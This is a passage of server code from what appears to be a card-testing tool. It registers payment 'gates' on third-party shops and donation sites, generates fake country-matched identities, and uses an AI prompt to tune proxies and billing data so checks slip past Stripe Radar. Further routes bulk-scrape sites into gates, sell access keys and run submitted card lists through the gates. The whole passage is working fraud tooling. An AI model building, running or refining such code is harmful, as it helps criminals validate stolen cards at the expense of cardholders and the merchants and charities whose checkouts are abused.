        { line1:"111 Sussex Dr",           city:"Ottawa",     state:"ON", zip:"K1N 1J1" },
        { line1:"1200 Waterfront Centre",  city:"Winnipeg",   state:"MB", zip:"R3C 4X5" },
      ],
      phone: "+1",
      currency: "cad",
    },
    AU: {
      firstName: ["Oliver","William","Jack","Noah","James","Lucas","Henry","Thomas","Ethan","Mason","Liam","Alexander","Charlie","Harry","George","Sebastian","Elijah","Aiden","Daniel","Logan"],
      lastName:  ["Smith","Jones","Williams","Brown","Wilson","Taylor","Johnson","White","Martin","Anderson","Thompson","Scott","Thomas","Davis","Moore","Harris","Mitchell","Robinson","Campbell","Walker"],
      email:     ["gmail.com","yahoo.com.au","hotmail.com","outlook.com","bigpond.com","optusnet.com.au","iinet.net.au"],
      addresses: [
        { line1:"1 Macquarie St",          city:"Sydney",     state:"NSW", zip:"2000" },
        { line1:"200 Collins St",          city:"Melbourne",  state:"VIC", zip:"3000" },
        { line1:"1 William St",            city:"Brisbane",   state:"QLD", zip:"4000" },
        { line1:"197 St Georges Terrace",  city:"Perth",      state:"WA",  zip:"6000" },
        { line1:"25 Grenfell St",          city:"Adelaide",   state:"SA",  zip:"5000" },
      ],
      phone: "+61",
      currency: "aud",
    },
    DE: {
      firstName: ["Lukas","Leon","Luca","Jonas","Finn","Ben","Elias","Paul","Tim","Felix","Max","Noah","Jan","Nico","Julian","David","Tobias","Simon","Patrick","Moritz"],
      lastName:  ["Müller","Schmidt","Schneider","Fischer","Weber","Meyer","Wagner","Becker","Schulz","Hoffmann","Schäfer","Koch","Bauer","Richter","Klein","Wolf","Schröder","Neumann","Schwarz","Zimmermann"],
      email:     ["gmail.com","yahoo.de","hotmail.de","web.de","gmx.de","outlook.de","t-online.de"],
      addresses: [
        { line1:"Unter den Linden 1",  city:"Berlin",    state:"Berlin",  zip:"10117" },
        { line1:"Marienplatz 1",        city:"Munich",    state:"Bavaria", zip:"80331" },
        { line1:"Römerberg 23",         city:"Frankfurt", state:"Hesse",   zip:"60311" },
        { line1:"Rathausmarkt 1",       city:"Hamburg",   state:"Hamburg", zip:"20095" },
        { line1:"Königstraße 1",        city:"Stuttgart", state:"Baden-Württemberg", zip:"70173" },
      ],
      phone: "+49",
      currency: "eur",
    },
    FR: {
      firstName: ["Gabriel","Raphaël","Léo","Louis","Lucas","Hugo","Arthur","Tom","Nathan","Mathis","Baptiste","Théo","Axel","Alexandre","Antoine","Nicolas","Clément","Romain","Julien","Thomas"],
      lastName:  ["Martin","Bernard","Thomas","Petit","Robert","Richard","Durand","Dubois","Moreau","Laurent","Simon","Michel","Lefebvre","Leroy","Roux","David","Bertrand","Morel","Fournier","Girard"],
      email:     ["gmail.com","yahoo.fr","hotmail.fr","outlook.fr","orange.fr","free.fr","sfr.fr","laposte.net"],
      addresses: [
        { line1:"1 Rue de Rivoli",    city:"Paris",     state:"Île-de-France", zip:"75001" },
        { line1:"Place Bellecour",    city:"Lyon",      state:"Auvergne-Rhône-Alpes", zip:"69002" },
        { line1:"1 La Canebière",     city:"Marseille", state:"Provence-Alpes-Côte d'Azur", zip:"13001" },
        { line1:"1 Place du Capitole",city:"Toulouse",  state:"Occitanie", zip:"31000" },
      ],
      phone: "+33",
      currency: "eur",
    },
  };

  app.post("/api/ai/reconfigure-gates", async (req, res) => {
    const { model, gateIds, autoApply } = req.body;
    // Accept the key in the body for backwards compatibility with the existing
    // Dashboard form, OR fall back to the AI Console's stored key.
    const nvidiaApiKey = (req.body?.nvidiaApiKey || readAIKey()).trim();

    if (!nvidiaApiKey) return res.status(400).json({ message: "NVIDIA API key required — save one on the AI Console" });
    if (!Array.isArray(gateIds) || gateIds.length === 0) return res.status(400).json({ message: "Select at least one gate" });

    const allGates = await storage.getGateConfigs();
    const selectedGates = allGates.filter(g => gateIds.includes(g.id));
    if (selectedGates.length === 0) return res.status(404).json({ message: "No matching gates found" });

    const systemPrompt = `You are an expert payment gateway configuration specialist. Your job is to generate complete, realistic, and optimized settings for payment gate configurations to maximize approval rates and minimize Stripe Radar fraud risk scores.

═══ STRIPE RADAR SCORING ═══
Risk score 0-99:
• ≥75 (highest) → AUTO-BLOCKED, never sent to network
• ≥65 (elevated) → placed in manual review queue
• <65 (normal) → authorized

Risk reducers by impact:
• Advanced device fingerprint via Stripe.js: −36%
• IP address match to billing country: −12%
• Customer email present: −11%
• Customer name present: −3%
• Complete billing address: −1%

Key rules:
• proxyCountry MUST equal billingCountry (prevents IP/geo mismatch = high risk signal)
• Billing + shipping addresses MUST match exactly (mismatched ship-to = fraud signal)
• Use realistic data that matches the gate's website country (infer from URL TLD)
• currency must match the country (GB→gbp, US→usd, CA→cad, AU→aud, DE/FR→eur, else→usd)

═══ ALL GATE FIELDS YOU MUST SET ═══
Every field listed here is important. Set ALL of them:

IDENTITY:
• billingFirstName — realistic first name for the country
• billingLastName — realistic last name for the country
• billingEmail — firstname.lastname@domain.com (realistic, not fake-sounding)

BILLING ADDRESS (complete, realistic, matches country):
• billingAddress — street number + street name
• billingCity — real city name
• billingState — state/province/region (full name or standard code)
• billingZip — correct postal/zip code format for the country
• billingCountry — ISO-2 code: US, GB, CA, AU, DE, FR, etc.
• billingPhone — E.164 format (+1 for US/CA, +44 for GB, +61 for AU, +49 for DE, +33 for FR)

SHIPPING ADDRESS (must mirror billing exactly — same person ships to same address):
• shippingFirstName — same as billingFirstName
• shippingLastName — same as billingLastName
• shippingAddress — same as billingAddress
• shippingCity — same as billingCity
• shippingState — same as billingState
• shippingZip — same as billingZip
• shippingCountry — same as billingCountry

PAYMENT SETTINGS:
• currency — lowercase ISO code matching country (usd/gbp/cad/aud/eur)
• donateAmount — "1.00" (use "5.00" for charity/GiveWP gates)
• timeout — 15000 (milliseconds)

PROXY/IP:
• proxyCountry — MUST be the same ISO-2 code as billingCountry

PLATFORM (infer from URL + gate type):
• platform — one of:
  - "woocommerce"   → WooCommerce site (most common)
  - "givewp"        → GiveWP donation plugin (charity/donation sites)
  - "shopify"       → Shopify store (.myshopify.com, shopify in URL, or modern checkout flow)
  - "gravityforms"  → GravityForms + Stripe (form-based donation)
  - "bigcommerce"   → BigCommerce store (gateType=braintree + BC Stencil platform)
  - "payeezy"       → WooCommerce + First Data Payeezy gateway
  - "whmcs"         → WHMCS billing panel (fastpanda.co.uk, proxywing.com style)
  - "generic"       → anything else
• checkoutPath — "/checkout/" for WooCommerce, "/donate/" for GiveWP, "/cart" for Shopify, "/checkout" for BigCommerce, "/" for others
• shopPath — "/shop/" for WooCommerce, "/collections/all" for Shopify, "/store/" alternative, "/" for generic
• wcPaySlug — WooCommerce payment method slug:
  - "stripe"               → standard WC Stripe plugin
  - "stripe_cc"            → WC Stripe credit-card only
  - "woocommerce_payments" → WC Payments (Stripe-based)
  - "braintree_cc"         → WC Braintree plugin (set when gateType=braintree + WC site)
  - "first_data_payeezy_gateway_credit_card" → First Data Payeezy (payeezy platform)
  - ""                     → leave empty for non-WooCommerce gates
• productId — WooCommerce/Shopify product ID to add to cart (0 = auto-discover; set real ID only if known)
• btFlow — ONLY for Braintree gates (gateType=braintree). Controls which Braintree checkout flow to use:
  - "wc_braintree_addpm"   → WooCommerce + Braintree add-payment-method page (e.g. petcostumecenter.com)
  - "wc_braintree"         → WooCommerce + Braintree checkout with Cardinal 3DS (e.g. developmentcomoz.co.uk)
  - "bigcommerce_stencil"  → BigCommerce Stencil storefront checkout (greatlakespetfood.com style; platform="bigcommerce")
  - ""                     → Auto: tries WC add-payment-method first, falls back to WC checkout, then token-only
  Leave btFlow as "" for non-Braintree gates.
• For gateType="payeezy" (platform="payeezy", WooCommerce + First Data Payeezy gateway): set wcPaySlug="first_data_payeezy_gateway_credit_card" and checkoutPath="/my-account/add-payment-method/".
• subType="wc_stripe_confirm_setup_intent" (gateType=stripe) — for WC Stripe sites exposing the createAndConfirmSetupIntentNonce AJAX flow (auto-register → add-payment-method → confirm setup intent). Use when the site clearly has WC Stripe but the standard payment_intents flow keeps failing.
• subType="stripe_page_confirm" (gateType=stripe) — for Stripe-hosted "Payment Page" checkouts (cs_… checkout-session id embedded directly in a low-value $1-3 page, confirmed via /v1/payment_pages/{cs_id}/confirm rather than the Checkout Sessions API).

═══ COUNTRY → ADDRESS EXAMPLES ═══
US: firstName=James lastName=Smith billingAddress="350 Fifth Avenue" billingCity=New York billingState=NY billingZip=10001 billingCountry=US billingPhone=+12125551234 currency=usd
GB: firstName=Oliver lastName=Smith billingAddress="30 St Mary Axe" billingCity=London billingState=England billingZip="EC3A 8BF" billingCountry=GB billingPhone=+442071234567 currency=gbp
CA: firstName=Liam lastName=Brown billingAddress="100 King St W" billingCity=Toronto billingState=ON billingZip="M5X 1A9" billingCountry=CA billingPhone=+14165551234 currency=cad
AU: firstName=Oliver lastName=Smith billingAddress="1 Macquarie St" billingCity=Sydney billingState=NSW billingZip=2000 billingCountry=AU billingPhone=+61291234567 currency=aud
DE: firstName=Lukas lastName=Müller billingAddress="Unter den Linden 1" billingCity=Berlin billingState=Berlin billingZip=10117 billingCountry=DE billingPhone=+493012345678 currency=eur
FR: firstName=Gabriel lastName=Martin billingAddress="1 Rue de Rivoli" billingCity=Paris billingState="Île-de-France" billingZip=75001 billingCountry=FR billingPhone=+33123456789 currency=eur

═══ OUTPUT FORMAT ═══
Respond with ONLY valid JSON, no markdown, no text outside the JSON:
{
  "analysis": "2-3 sentence summary: what country each gate targets, what was missing, what was optimized",
  "gates": [
    {
      "id": "exact_gate_id",
      "name": "gate name",
      "detectedCountry": "US",
      "changes": {
        "billingFirstName": "James",
        "billingLastName": "Smith",
        "billingEmail": "james.smith@gmail.com",
        "billingAddress": "350 Fifth Avenue",
        "billingCity": "New York",
        "billingState": "NY",
        "billingZip": "10001",
        "billingCountry": "US",
        "billingPhone": "+12125551234",
        "shippingFirstName": "James",
        "shippingLastName": "Smith",
        "shippingAddress": "350 Fifth Avenue",
        "shippingCity": "New York",
        "shippingState": "NY",
        "shippingZip": "10001",
        "shippingCountry": "US",
        "currency": "usd",
        "donateAmount": "1.00",
        "timeout": 15000,
        "proxyCountry": "US",
        "platform": "woocommerce",
        "checkoutPath": "/checkout/",
        "shopPath": "/shop/",
        "wcPaySlug": "stripe",
        "productId": 0,
        "btFlow": ""
      },
      "reason": "One sentence explaining key Radar optimizations applied"
    }
  ]
}`;

    const gateDescriptions = selectedGates.map(g => {
      const s = (g.settings as any) || {};
      const detectedCountry = inferCountryFromUrl(g.url);
      const pool = ADDRESS_POOL[detectedCountry] || ADDRESS_POOL["US"];
      const sampleAddr = pool.addresses[0];
      return `GATE:
  id="${g.id}"
  name="${g.name}"
  type="${g.gateType}/${g.subType}"
  url="${g.url}"
  inferredCountry="${detectedCountry}"
  suggestedCurrency="${pool.currency}"
  sampleAddress="${sampleAddr.line1}, ${sampleAddr.city}, ${sampleAddr.state} ${sampleAddr.zip}, ${detectedCountry}"

CURRENT SETTINGS (MISSING = not set, needs to be filled):
  billingFirstName: ${s.billingFirstName || "MISSING"}
  billingLastName: ${s.billingLastName || "MISSING"}
  billingEmail: ${s.billingEmail || "MISSING"}
  billingAddress: ${s.billingAddress || "MISSING"}
  billingCity: ${s.billingCity || "MISSING"}
  billingState: ${s.billingState || "MISSING"}
  billingZip: ${s.billingZip || "MISSING"}
  billingCountry: ${s.billingCountry || "MISSING"}
  billingPhone: ${s.billingPhone || "MISSING"}
  shippingFirstName: ${s.shippingFirstName || "MISSING"}
  shippingLastName: ${s.shippingLastName || "MISSING"}
  shippingAddress: ${s.shippingAddress || "MISSING"}
  shippingCity: ${s.shippingCity || "MISSING"}
  shippingState: ${s.shippingState || "MISSING"}
  shippingZip: ${s.shippingZip || "MISSING"}
  shippingCountry: ${s.shippingCountry || "MISSING"}
  currency: ${s.currency || "MISSING"}
  donateAmount: ${s.donateAmount || "MISSING"}
  timeout: ${s.timeout || "MISSING"}
  proxyCountry: ${s.proxyCountry || "MISSING"}
  platform: ${s.platform || "MISSING"}
  checkoutPath: ${s.checkoutPath || "MISSING"}
  shopPath: ${s.shopPath || "MISSING"}
  wcPaySlug: ${s.wcPaySlug || "MISSING"}
  productId: ${s.productId !== undefined ? s.productId : "MISSING (use 0 for auto-discover)"}
  btFlow: ${s.btFlow !== undefined ? (s.btFlow || '""') : "MISSING (set for braintree gates, else leave empty string)"}`;
    }).join("\n\n---\n\n");

    try {
      const aiRes = await fetch("https://integrate.api.nvidia.com/v1/chat/completions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${nvidiaApiKey}`,
        },
        body: JSON.stringify({
          model: model || "meta/llama-3.1-70b-instruct",
          messages: [
            { role: "system", content: systemPrompt },
            { role: "user", content: `Configure all fields for these gates. Use realistic data matching each gate's inferred country:\n\n${gateDescriptions}` },
          ],
          temperature: 0.4,
          max_tokens: 4096,
          top_p: 0.9,
        }),
        signal: AbortSignal.timeout(45000),
      });

      if (!aiRes.ok) {
        const errText = await aiRes.text();
        return res.status(aiRes.status).json({ message: `NVIDIA API: ${errText.slice(0, 300)}` });
      }

      const aiData = await aiRes.json();
      const rawContent: string = aiData.choices?.[0]?.message?.content || "{}";

      // Strip markdown fences if model wraps in ```json ... ```
      const cleaned = rawContent
        .replace(/^```(?:json)?\s*/i, "")
        .replace(/\s*```\s*$/i, "")
        .trim();
      let parsed: any;
      try { parsed = JSON.parse(cleaned); } catch { parsed = { analysis: cleaned, gates: [] }; }

      // Attach country-detection info for UI display
      if (Array.isArray(parsed.gates)) {
        for (const rec of parsed.gates) {
          const gate = selectedGates.find(g => g.id === rec.id);
          if (gate && !rec.detectedCountry) {
            rec.detectedCountry = inferCountryFromUrl(gate.url);
          }
        }
      }

      if (autoApply && Array.isArray(parsed.gates) && parsed.gates.length > 0) {
        const updates: Promise<any>[] = [];
        for (const rec of parsed.gates) {
          const gate = selectedGates.find(g => g.id === rec.id);
          if (!gate || !rec.changes || typeof rec.changes !== "object") continue;
          const current = { ...(gate.settings as any) };
          for (const [key, val] of Object.entries(rec.changes)) {
            const emptyOk = key === "btFlow" || key === "wcPaySlug";
            if (val !== undefined && val !== null && (emptyOk || String(val).trim() !== "")) {
              current[key] = val;
            }
          }
          updates.push(storage.updateGateConfig(gate.id, { settings: normalizeSettings(current) }));
        }
        await Promise.all(updates);
        const applied = updates.length;
        await storage.createSystemLog({
          level: "SUCCESS",
          message: `AI reconfigured ${applied} gate(s) via ${model || "llama-3.1-70b"} — billing/shipping/proxy/platform all updated`,
          source: "ai-reconfigurer",
        });
        parsed.applied = applied;
      }

      return res.json(parsed);
    } catch (error: any) {
      return res.status(500).json({ message: error.message });
    }
  });

  // Apply pre-computed AI changes (from preview mode)
  app.post("/api/ai/apply-changes", async (req, res) => {
    const { gates: gateChanges } = req.body;
    if (!Array.isArray(gateChanges) || gateChanges.length === 0) {
      return res.status(400).json({ message: "No changes to apply" });
    }
    const allGates = await storage.getGateConfigs();
    const updates: Promise<any>[] = [];
    for (const rec of gateChanges) {
      const gate = allGates.find(g => g.id === rec.id);
      if (!gate || !rec.changes || typeof rec.changes !== "object") continue;
      const current = { ...(gate.settings as any) };
      for (const [key, val] of Object.entries(rec.changes)) {
        const emptyOk = key === "btFlow" || key === "wcPaySlug";
        if (val !== undefined && val !== null && (emptyOk || String(val).trim() !== "")) {
          current[key] = val;
        }
      }
      updates.push(storage.updateGateConfig(gate.id, { settings: normalizeSettings(current) }));
    }
    await Promise.all(updates);
    const applied = updates.length;
    await storage.createSystemLog({
      level: "SUCCESS",
      message: `AI preview applied to ${applied} gate(s)`,
      source: "ai-reconfigurer",
    });
    return res.json({ applied, message: `Applied to ${applied} gate(s)` });
  });

  // ─── Multi-provider AI key management ──────────────────────────────────────
  app.get("/api/ai/providers", async (_req, res) => {
    const providers = (Object.keys(AI_PROVIDERS) as AIProvider[]).map(p => ({
      id:        p,
      keyStatus: aiKeySource(p),
      masked:    maskAIKey(readAIKey(p)),
      models:    AI_PROVIDERS[p].models,
      default:   AI_PROVIDERS[p].defaultModel,
      baseUrl:   AI_PROVIDERS[p].baseUrl,
    }));
    res.json({ providers, active: getActiveProvider() });
  });

  app.put("/api/ai/providers/:provider/key", async (req, res) => {
    const provider = req.params.provider as AIProvider;
    if (!AI_PROVIDERS[provider]) return res.status(400).json({ message: "Unknown provider" });
    const { key } = req.body;
    if (!key || typeof key !== "string") return res.status(400).json({ message: "key required" });
    writeAIKey(key, provider);
    res.json({ ok: true, masked: maskAIKey(key), source: aiKeySource(provider) });
  });

  app.delete("/api/ai/providers/:provider/key", async (req, res) => {
    const provider = req.params.provider as AIProvider;
    if (!AI_PROVIDERS[provider]) return res.status(400).json({ message: "Unknown provider" });
    clearAIKey(provider);
    res.json({ ok: true });
  });

  // Test an AI provider key by sending a minimal chat request
  app.post("/api/ai/providers/:provider/test", async (req, res) => {
    const provider = req.params.provider as AIProvider;
    if (!AI_PROVIDERS[provider]) return res.status(400).json({ message: "Unknown provider" });
    const key = readAIKey(provider);
    if (!key) return res.status(400).json({ message: "No key configured for this provider" });
    try {
      const result = await aiChat({
        messages: [{ role: "user", content: "Reply with just: OK" }],
        maxTokens: 10,
        provider,
      });
      if (!result) return res.status(500).json({ ok: false, message: "Provider returned no response" });
      res.json({ ok: true, provider: result.provider, model: result.model, reply: result.content.slice(0, 50) });
    } catch (e: any) {
      res.status(500).json({ ok: false, message: e.message });
    }
  });

  // ─── URL Processor endpoints ───────────────────────────────────────────────
  app.post("/api/url-process", async (req, res) => {
    try {
      const { text, urls: directUrls } = req.body;
      if (!text && !directUrls) return res.status(400).json({ message: "text or urls required" });

      let input = text || "";
      if (directUrls && Array.isArray(directUrls)) {
        input = directUrls.join("\n");
      }

      const result = await processRawInput(input);
      res.json(result);
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  app.post("/api/url-process/urls", async (req, res) => {
    try {
      const { urls } = req.body;
      if (!urls || !Array.isArray(urls) || urls.length === 0) {
        return res.status(400).json({ message: "urls array required" });
      }
      const { processURLs } = await import("./url-processor");
      const results = await processURLs(urls);
      res.json({ results });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // ─── AI Website Collector endpoints ────────────────────────────────────────
  app.post("/api/ai/collect", async (req, res) => {
    try {
      const { keyword, provider, model } = req.body;
      if (!keyword) return res.status(400).json({ message: "keyword required" });

      if (!hasAnyAIKey()) {
        return res.status(400).json({ message: "No AI key configured. Set NVIDIA_API_KEY or DEEPSEEK_API_KEY." });
      }

      const result = await collectWebsites(keyword, { provider, model });
      res.json(result);
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  app.post("/api/ai/collect/batch", async (req, res) => {
    try {
      const { keywords, provider, model } = req.body;
      if (!keywords || !Array.isArray(keywords) || keywords.length === 0) {
        return res.status(400).json({ message: "keywords array required" });
      }
      if (!hasAnyAIKey()) {
        return res.status(400).json({ message: "No AI key configured." });
      }

      const results = await collectWebsitesBatch(keywords, { provider, model });
      const allSites = results.flatMap(r => r.sites);
      res.json({ results, totalSites: allSites.length });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  app.post("/api/ai/analyze-site", async (req, res) => {
    try {
      const { url, provider, model } = req.body;
      if (!url) return res.status(400).json({ message: "url required" });
      if (!hasAnyAIKey()) return res.status(400).json({ message: "No AI key configured." });

      const result = await analyzeSiteGateway(url, { provider, model });
      res.json(result);
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // AI "Suggest & Polish" for a single gate configuration.
  //  - POLISH: re-run live gateway detection to refresh keys / subtype / signals.
  //  - SUGGEST: ask the LLM what setting changes optimize approval & lower Radar risk.
  // Returns the detection, an AI analysis, the suggested changes, and a fully
  // merged `polishedSettings` object ready to apply in one click.
  app.post("/api/ai/gate-suggest", async (req, res) => {
    try {
      const { gateType, subType, url, settings, provider, model } = req.body || {};
      if (!url) return res.status(400).json({ message: "url required" });
      if (!hasAnyAIKey()) return res.status(400).json({ message: "No AI key configured." });

      // ── POLISH: live detection refresh ──
      let detection: any = null;
      try { detection = await detectGateFromUrl(url); } catch { detection = null; }
      const detectionKnown = !!detection && ["stripe", "shopify", "braintree", "payeezy", "paypal", "adyen"].includes(detection.gateType);
      const detectedType = detectionKnown ? detection.gateType : (gateType || "stripe");
      const detectedSub = detectionKnown && detection.subType ? detection.subType : (subType || "standard");
      const detectedSettings = detectionKnown ? (detection.settings || {}) : {};

      const currentSettings = settings || {};
      const sysPrompt = `You are an expert payment gateway configuration specialist. Optimize a single gate config to maximize approval rate and minimize Stripe Radar fraud risk.

Critical rules:
• proxyCountry MUST equal billingCountry (prevents IP/geo mismatch = high risk).
• billing + shipping addresses MUST match exactly.
• currency must match the country (GB→gbp, US→usd, CA→cad, AU→aud, DE/FR→eur, else→usd).
• platform/subtype must match the site (woocommerce, givewp, shopify, gravityforms, bigcommerce, payeezy, whmcs, generic).

Return ONLY valid JSON, no markdown:
{ "analysis": "1-2 sentence summary of what was missing/optimized", "changes": { ...only the fields to change... }, "confidence": 0.0-1.0 }`;

      const userPrompt = `Gate to optimize:
- type: ${detectedType}
- subtype: ${detectedSub}
- url: ${url}
- live detection: ${JSON.stringify({
        publicKey: detectedSettings.publicKey ? "present" : "missing",
        btClientToken: detectedSettings.btClientToken ? "present" : "missing",
        signals: detection?.signals || [],
      })}
- current settings: ${JSON.stringify(currentSettings).slice(0, 2000)}

Suggest the SMALLEST set of changes that maximize approval and lower risk. Only include fields that should change.`;

      const result = await aiChat({
        provider, model,
        messages: [
          { role: "system", content: sysPrompt },
          { role: "user", content: userPrompt },
        ],
        maxTokens: 1500,
        temperature: 0.3,
      });

      let raw = result.content.trim();
      const jsonMatch = raw.match(/```(?:json)?\s*([\s\S]*?)```/);
      if (jsonMatch) raw = jsonMatch[1].trim();

      let parsed: any = {};
      try { parsed = JSON.parse(raw); } catch { parsed = {}; }
      const changes = parsed.changes && typeof parsed.changes === "object" ? parsed.changes : {};
      const analysis = String(parsed.analysis || "");
      const confidence = typeof parsed.confidence === "number" ? parsed.confidence : 0.5;

      // ── Build the polished (merged) settings ──
      const polishedSettings: any = { ...currentSettings, ...detectedSettings, ...changes };
      polishedSettings.siteUrl = url;

      res.json({
        detection: {
          gateType: detectedType,
          subType: detectedSub,
          confidence: detection?.confidence || 0,
          publicKey: detectedSettings.publicKey || null,
          signals: detection?.signals || [],
        },
        analysis,
        suggestions: [{ reason: analysis || "AI optimization", settings: changes, confidence }],
        polishedSettings,
      });
    } catch (e: any) {
      res.status(500).json({ message: e.message });
    }
  });

  // Take collected sites and turn them directly into gate configs. Each site
  // is "polished" by running live gateway detection to refine the gate type
  // and settings; if detection fails we fall back to the AI's guess.
  app.post("/api/ai/configure-gates", async (req, res) => {
    try {
      const { sites } = req.body || {};
      if (!Array.isArray(sites) || sites.length === 0) {
        return res.status(400).json({ message: "sites array required" });
      }
      const result = await configureGatesFromSites(sites);
      res.json(result);
    } catch (e: any) {
      res.status(500).json({ message: e?.message || "Failed to configure gates" });
    }
  });

  // One-call "skill": collect sites for the given keywords AND directly
  // configure them as polished gates. Best of both steps in a single request.
  app.post("/api/ai/collect-and-configure", async (req, res) => {
    try {
      const { keywords, provider, model } = req.body || {};
      const kws = Array.isArray(keywords) ? keywords : (keywords ? [keywords] : []);
      if (kws.length === 0) return res.status(400).json({ message: "keywords required" });
      if (!hasAnyAIKey()) return res.status(400).json({ message: "No AI key configured." });

      const results = await collectWebsitesBatch(kws, { provider, model });
      const sites = results.flatMap(r => r.sites);
      if (sites.length === 0) {
        return res.json({ results, sites: [], configured: { created: [], skipped: [], total: 0, createdCount: 0 } });
      }
      const configured = await configureGatesFromSites(sites);
      res.json({ results, sites, configured });
    } catch (e: any) {
      res.status(500).json({ message: e?.message || "Failed to collect and configure" });
    }
  });

  app.get("/api/gates/types", async (_req, res) => {
    res.json(GATE_TYPES);
  });

  app.post("/api/gates/detect-url", async (req, res) => {
    const { url } = req.body;
    if (!url) {
      return res.status(400).json({ message: "URL required" });
    }

    try {
      await storage.createSystemLog({
        level: "INFO",
        message: `Auto-detect started for: ${url}`,
        source: "gate-detector",
      });

      const detection = await detectGateFromUrl(url);

      await storage.createSystemLog({
        level: detection.gateType !== "unknown" ? "SUCCESS" : "WARN",
        message: `Detection result: ${detection.gateType} (${detection.confidence}% conf) - crawled ${detection.crawledPaths.length} paths`,
        source: "gate-detector",
      });

      res.json(detection);
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.post("/api/gates/auto-setup", async (req, res) => {
    const { url } = req.body;
    if (!url) {
      return res.status(400).json({ message: "URL required" });
    }

    try {
      const detection = await detectGateFromUrl(url);

      if (detection.gateType === "unknown") {
        return res.status(400).json({ message: "Could not detect any payment gateway on this site", detection });
      }
      if (detection.gateType === "unsupported") {
        return res.status(400).json({
          message: `Detected ${detection.settings.unsupportedPlatform || "an unsupported"} SaaS donation platform. We don't have a first-class checker flow for it — supporting it is a separate per-platform engineering project. The gate was NOT saved.`,
          detection,
        });
      }

      const gateName = autoGateName(detection.gateType, detection.siteUrl);

      const gate = await storage.createGateConfig({
        name: gateName,
        gateType: detection.gateType,
        subType: detection.subType,
        url: detection.siteUrl,
        active: true,
        settings: normalizeSettings(detection.settings),
      });

      await storage.createSystemLog({
        level: "SUCCESS",
        message: `Auto-configured gate "${gateName}" from ${safeHostname(detection.siteUrl)} (${detection.confidence}% confidence, ${detection.signals.length} signals)`,
        source: "gate-detector",
      });

      res.json({ gate, detection });
    } catch (error: any) {
      res.status(500).json({ message: error.message });
    }
  });

  app.post("/api/gates/bulk-setup", async (req, res) => {
    const { urls } = req.body;
    if (!urls || !Array.isArray(urls) || urls.length === 0) {
      return res.status(400).json({ message: "URLs array required" });
    }

    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    res.flushHeaders();

    const sendEvent = (data: any) => {
      res.write(`data: ${JSON.stringify(data)}\n\n`);
    };

    let configured = 0;
    let failed = 0;

    for (let i = 0; i < urls.length; i++) {
      const rawUrl = urls[i].trim();
      if (!rawUrl) {
        sendEvent({ index: i, url: rawUrl, status: "skipped", reason: "Empty URL" });
        continue;
      }

      sendEvent({ index: i, url: rawUrl, status: "scanning", progress: { current: i + 1, total: urls.length } });

      try {
        const detection = await detectGateFromUrl(rawUrl);

        if (detection.gateType === "unknown") {
          failed++;
          sendEvent({
            index: i, url: rawUrl, status: "failed",
            reason: "No gateway detected",
            crawledPaths: detection.crawledPaths?.length || 0,
            signals: detection.signals,
            progress: { current: i + 1, total: urls.length, configured, failed },
          });
          continue;
        }
        if (detection.gateType === "unsupported") {
          failed++;
          sendEvent({
            index: i, url: rawUrl, status: "failed",
            reason: `Unsupported SaaS platform: ${detection.settings.unsupportedPlatform}`,
            crawledPaths: detection.crawledPaths?.length || 0,
            signals: detection.signals,
            progress: { current: i + 1, total: urls.length, configured, failed },
          });
          continue;
        }

        const gateName = autoGateName(detection.gateType, detection.siteUrl);

        const gate = await storage.createGateConfig({
          name: gateName,
          gateType: detection.gateType,
          subType: detection.subType,
          url: detection.siteUrl,
          active: true,
          settings: normalizeSettings(detection.settings),
        });

        configured++;
        sendEvent({
          index: i, url: rawUrl, status: "success",
          gate: { id: gate.id, name: gate.name, gateType: gate.gateType, subType: gate.subType },
          publicKey: detection.settings.publicKey || null,
          btToken: detection.settings.btClientToken ? true : false,
          confidence: detection.confidence,
          signals: detection.signals,
          crawledPaths: detection.crawledPaths?.length || 0,
          subType: detection.subType,
          settings: detection.settings,
          progress: { current: i + 1, total: urls.length, configured, failed },
        });

        await storage.createSystemLog({
          level: "SUCCESS",
          message: `Bulk: Auto-configured "${gateName}" from ${safeHostname(detection.siteUrl)}`,
          source: "gate-detector",
        });
      } catch (error: any) {
        failed++;
        sendEvent({
          index: i, url: rawUrl, status: "error",
          reason: error.message,
          progress: { current: i + 1, total: urls.length, configured, failed },
        });
      }
    }

    sendEvent({
      status: "complete",
      total: urls.length,
      configured,
      failed,
    });

    res.end();
  });

  // Access Keys
  app.get("/api/keys", async (_req, res) => {
    const keys = await storage.getAccessKeys();
    res.json(keys);
  });

  app.post("/api/keys", async (req, res) => {
    const { durationDays, dailyLimit } = req.body;
    const keyStr = `H0-${randomBytes(2).toString("hex").toUpperCase()}-${randomBytes(2).toString("hex").toUpperCase()}-${randomBytes(2).toString("hex").toUpperCase()}`;

    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + (durationDays || 30));

    const key = await storage.createAccessKey({
      key: keyStr,
      durationDays: durationDays || 30,
      dailyLimit: dailyLimit || 1000,
      status: "unused",
    });

    await storage.createSystemLog({
      level: "INFO",
      message: `Access key generated: ${keyStr}`,
      source: "admin",
    });

    res.json(key);
  });

  app.delete("/api/keys/:id", async (req, res) => {
    await storage.deleteAccessKey(req.params.id);
    res.json({ success: true });
  });

  // Bot Users
  app.get("/api/bot-users", async (_req, res) => {
    const users = await storage.getBotUsers();
    res.json(users);
  });

  app.patch("/api/bot-users/:id", async (req, res) => {
    const user = await storage.updateBotUser(req.params.id, req.body);
    if (!user) return res.status(404).json({ message: "User not found" });
    res.json(user);
  });

  app.delete("/api/bot-users/:id", async (req, res) => {
    await storage.deleteBotUser(req.params.id);
    res.json({ success: true });
  });

  // Check Results — REAL GATE CHECKING
  app.get("/api/checks", async (req, res) => {
    const { checkedBy, status } = req.query;
    const results = await storage.getCheckResults({
      checkedBy: checkedBy as string,
      status: status as string,
    });
    res.json(results);
  });

  app.post("/api/checks", async (req, res) => {
    const { cards, gate, gateOverride } = req.body;
    if (!cards || !Array.isArray(cards)) {
      return res.status(400).json({ message: "Cards array required" });
    }
    _activeChecks++;
    try {
    // gateOverride lets the gate-editor "Test" button run unsaved settings
